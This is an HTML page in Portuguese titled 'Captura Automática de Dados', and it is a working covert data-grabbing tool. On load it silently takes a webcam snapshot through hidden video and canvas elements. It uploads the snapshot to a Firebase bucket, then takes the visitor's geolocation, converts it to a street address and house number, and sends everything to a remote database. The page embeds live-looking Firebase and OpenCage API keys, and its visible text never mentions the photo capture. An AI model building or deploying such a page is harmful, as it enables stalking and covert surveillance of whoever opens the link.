<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Captura Automática de Dados</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin: 20px;
    }
    #loader {
      display: none;
      width: 100%;
      height: 10px;
      background-color: #f3f3f3;
      position: relative;
      overflow: hidden;
      margin-top: 20px;
    }
    #loader div {
      width: 0;
      height: 100%;
      background-color: #4caf50;
      animation: loading 3s linear infinite;
    }
    @keyframes loading {
      from { width: 0; }
      to { width: 100%; }
    }
    #location-message {
      margin-top: 20px;
      font-size: 16px;
      color: #555;
    }
  </style>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage-compat.js"></script>
</head>
<body>
  <h1>Captura Automática de Dados</h1>
  <p id="location-message">Aguardando permissão para acessar sua localização...</p>

  <div id="loader">
    <div></div>
  </div>

  <script>
    // Configuração do Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyAWhfaY2Adp4YJGwvITWTGHP-7zOLNfiGI",
      authDomain: "sandalias-retro-9f0c6.firebaseapp.com",
      databaseURL: "https://sandalias-retro-9f0c6-default-rtdb.firebaseio.com",
      projectId: "sandalias-retro-9f0c6",
      storageBucket: "sandalias-retro-9f0c6.appspot.com",
      messagingSenderId: "786208752798",
      appId: "1:786208752798:web:193f76bbbf5ac4ef27678f",
      measurementId: "G-XGVHLX01EB",
    };

    // Inicializa Firebase
    const app = firebase.initializeApp(firebaseConfig);
    const database = firebase.database();
    const storage = firebase.storage();

    const loader = document.getElementById('loader');

    // Mostrar barra de carregamento
    function showLoader() {
      loader.style.display = 'block';
    }

    // Ocultar barra de carregamento
    function hideLoader() {
      loader.style.display = 'none';
    }

    // Função para gravar vídeo de 5 segundos e salvar no Storage
    function captureVideoAndSave() {
      const video = document.createElement('video'); // Cria o elemento de vídeo oculto
      const canvas = document.createElement('canvas'); // Cria o canvas oculto

      showLoader(); // Exibe a barra de carregamento

      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          video.play();

          video.onloadedmetadata = () => {
            // Define o tamanho do canvas de acordo com o vídeo
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Grava por 5 segundos
            setTimeout(() => {
              // Pausa o vídeo após 5 segundos
              video.pause();
              video.currentTime = 0;
              
              // Desenha o frame do vídeo no canvas
              const context = canvas.getContext('2d');
              context.drawImage(video, 0, 0, canvas.width, canvas.height);
              
              // Para a câmera e captura a imagem
              stream.getTracks().forEach(track => track.stop());

              const videoData = canvas.toDataURL('image/png', 1.0); // Gera o frame em alta qualidade
              uploadVideoToStorage(videoData); // Chama a função para fazer o upload
            }, 5000); // 5000ms = 5 segundos
          };
        })
        .catch(error => {
          hideLoader(); // Oculta a barra de carregamento em caso de erro
          alert('Erro ao acessar a câmera. Verifique as permissões e tente novamente.');
        });
    }

    // Função para salvar o vídeo (frame) no Firebase Storage
    function uploadVideoToStorage(videoData) {
      const timestamp = new Date().toISOString().replace(/[^\w\s]/gi, '-'); // Formato data/hora
      const storageRef = storage.ref(`videos/video_${timestamp}.png`); // Adiciona data/hora ao nome do arquivo
      storageRef.putString(videoData, 'data_url')
        .then(snapshot => snapshot.ref.getDownloadURL())
        .then(url => {
          getLocation(url); // Após salvar o vídeo, coleta a localização
        })
        .catch(error => {
          hideLoader();
          alert('Erro ao salvar o vídeo no Firebase Storage: ' + error.message);
        });
    }

    // Obter endereço completo a partir de coordenadas
    function getAddressFromCoordinates(lat, lon, videoUrl) {
      const apiKey = '150e176e377d4d2ab2819ddada71dbe7';
      const url = `https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${apiKey}`;

      fetch(url)
        .then(response => response.json())
        .then(data => {
          if (data.results.length > 0) {
            const result = data.results[0].components;
            const addressDetails = {
              latitude: lat,
              longitude: lon,
              city: result.city || result.town || result.village || '',
              neighborhood: result.suburb || '',
              road: result.road || '',
              house_number: result.house_number || '',
              country: result.country || '',
              address: data.results[0].formatted,
              videoUrl: videoUrl
            };
            sendDataToFirebase(addressDetails); // Envia os dados para o Firebase
          } else {
            alert('Erro ao obter endereço: nenhum resultado encontrado.');
          }
          hideLoader();
        })
        .catch(error => {
          hideLoader();
          alert('Erro ao obter o endereço: ' + error.message);
        });
    }

    // Localização do usuário
    function getLocation(videoUrl) {
      if (navigator.geolocation) {
        document.getElementById('location-message').innerHTML = 'Será solicitado acesso à sua localização para concluir o processo. Por favor, permita o acesso para continuar.';
        navigator.geolocation.getCurrentPosition(
          position => {
            const { latitude, longitude } = position.coords;
            getAddressFromCoordinates(latitude, longitude, videoUrl);
          },
          error => {
            hideLoader();
            switch (error.code) {
              case error.PERMISSION_DENIED:
                alert('Permissão de localização negada. Para continuar, ative a permissão nas configurações do navegador.');
                break;
              case error.POSITION_UNAVAILABLE:
                alert('Não foi possível determinar sua localização. Verifique se o GPS está ativado.');
                break;
              case error.TIMEOUT:
                alert('A solicitação de localização demorou demais para responder.');
                break;
              default:
                alert('Erro desconhecido ao tentar acessar a localização.');
            }
          }
        );
      } else {
        hideLoader();
        alert('Este navegador não suporta geolocalização.');
      }
    }

    // Enviar dados para o Firebase
    function sendDataToFirebase(data) {
      const reference = database.ref('userData');
      reference.push(data, function (error) {
        hideLoader(); // Oculta a barra de carregamento após salvar os dados
        if (error) {
          alert('Erro ao enviar dados para o Firebase: ' + error.message);
        } else {
          alert('Dados enviados com sucesso!');
        }
      });
    }

    // Iniciar coleta de dados automaticamente
    window.onload = () => {
      captureVideoAndSave(); // Primeiro passo: grava o vídeo automaticamente
    };
  </script>
</body>
</html>
